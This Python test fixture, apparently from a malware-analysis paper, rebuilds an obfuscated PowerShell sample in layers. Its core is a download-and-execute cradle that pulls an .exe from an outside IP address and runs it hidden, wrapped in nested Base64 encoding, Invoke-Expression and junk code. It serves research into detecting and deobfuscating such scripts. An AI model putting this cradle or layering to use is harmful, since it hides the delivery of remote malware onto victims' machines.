"""Fixture generating Sample 47cae3c0 described in Section 3.4, Figures 7 & 8, and Appendix E."""

import base64


def generate_sample_47cae3c0() -> str:
    """Builds the 4-layer nested obfuscated PowerShell sample from the paper.

    Layer 4: Recovered download-execute cradle with C2 URL
    Layer 3: UTF-16LE bytes of Layer 4
    Layer 2: PowerShell script with embedded Base64 of Layer 3
    Layer 1: UTF-16LE bytes of Layer 2
    Layer 0: Junk-obfuscated PowerShell script with embedded Base64 of Layer 1
    """
    # Depth 4: Terminal payload (Figure 8)
    depth_4_script = (
        "[Net.ServicePointManager]::SecurityProtocol = 'Tls12'\n"
        "$workDir = -join @(\"C\",\":\",\"\\ProgramData\",\"\\Zooms\")\n"
        "$url = \"http://85.239.149.78:6600/ks3mscqz/dfgsdfgbvbb.exe\"\n"
        "$http = New-Object -ComObject \"WinHTTP.WinHTTPRequest.5.1\"\n"
        "$http.Open(\"GET\", $url, $false); $http.Send()\n"
        "[IO.File]::WriteAllBytes($filePath, $http.ResponseBody)\n"
        "Start-Process -FilePath $filePath -WindowStyle Hidden\n"
    )

    # Encode Depth 4 into UTF-16LE and Base64 for Depth 2
    depth_4_utf16 = depth_4_script.encode("utf-16-le")
    depth_3_b64 = base64.b64encode(depth_4_utf16).decode("ascii")

    # Depth 2: Intermediate PowerShell layer
    depth_2_script = (
        "$enc_blob = '" + depth_3_b64 + "'\n"
        "$bytes = [System.Convert]::FromBase64String($enc_blob)\n"
        "$decoded = [System.Text.Encoding]::Unicode.GetString($bytes)\n"
        "Invoke-Expression $decoded\n"
    )

    # Encode Depth 2 into UTF-16LE and Base64 for Depth 0
    depth_2_utf16 = depth_2_script.encode("utf-16-le")
    depth_1_b64 = base64.b64encode(depth_2_utf16).decode("ascii")

    # Depth 0: Outer junk-obfuscated script (Figure 7 & Appendix E)
    junk_lines = [
        "$EBhNgQ = 79 * 40 + 82",
        "$RdpAZCZz = [System.IO.Path]::GetTempPath()",
        "function StlutUwIVFor { return '1977' }",
        "$junkA = Get-Random -Minimum 10 -Maximum 999",
        "$junkB = Get-Random -Minimum 10 -Maximum 999",
        "$junkC = Get-Random -Minimum 10 -Maximum 999",
        "$junkD = Get-Random -Minimum 10 -Maximum 999",
    ]
    depth_0_script = (
        "# depth 0 - junk-obfuscated PowerShell\n"
        + "\n".join(junk_lines)
        + "\n"
        + f"$data = '{depth_1_b64}'\n"
        + "([ScriptBlock]::Create((d $data))) # execute decoded payload\n"
    )

    return depth_0_script
